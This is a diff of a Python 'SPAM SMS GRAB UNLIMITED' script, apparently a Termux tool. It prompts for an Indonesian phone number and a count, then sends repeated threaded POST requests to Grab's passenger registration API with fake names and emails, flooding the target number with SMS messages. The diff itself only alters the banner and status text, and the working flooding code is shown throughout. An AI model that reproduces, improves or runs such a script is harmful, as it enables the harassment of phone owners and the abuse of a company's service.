@@ -21,9 +21,10 @@ try:
 	print("""\033[1;32m
    _  _
  _| || |_   \033[1;36m..::SPAM SMS GRAB UNLIMITED::..\033[1;32m
-|_  ..  _|  \033[1;31mCoded by: @thetermuxchoice\033[1;32m
-|_      _|  \033[1;31mGmail   : Henrycko.Developer@gmail.com\033[1;32m
-  |_||_|    \033[1;31mThanks  : https://www.grab.com/id/\033[1;32m
+|_  ..  _|  \033[1;31mAuthor: @thetermuxchoice\033[1;32m
+|_      _|  \033[1;31mGmail : Henrycko.Developer@gmail.com\033[1;32m
+  |_||_|    \033[1;31mThanks: https://www.grab.com/id/\033[1;32m
+
 """)
 	no = input("\033[1;37m[?] NOMOR 62XXXXXXXXXX =>\033[1;36m ")
 	jum=int(input("\033[1;37m[?] Jumlah => \033[1;36m"))
@@ -38,7 +39,7 @@ def main(arg):
 		r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
 #		print(r.text)
 		if str(idk) in str(r.text):
-			print("\033[1;32m[+] SUKSES")
+			print("\033[1;32m[+] BERHASIL")
 		else:
 			print("\033[1;31m[-] GAGAL")
 	except: pass
@@ -48,4 +49,4 @@ for x in range(jum):
     jobs.append(x)
 p=ThreadPool(5)
 p.map(main,jobs)
-print("Sukses, Berhasil")
+print("Selesai!...")
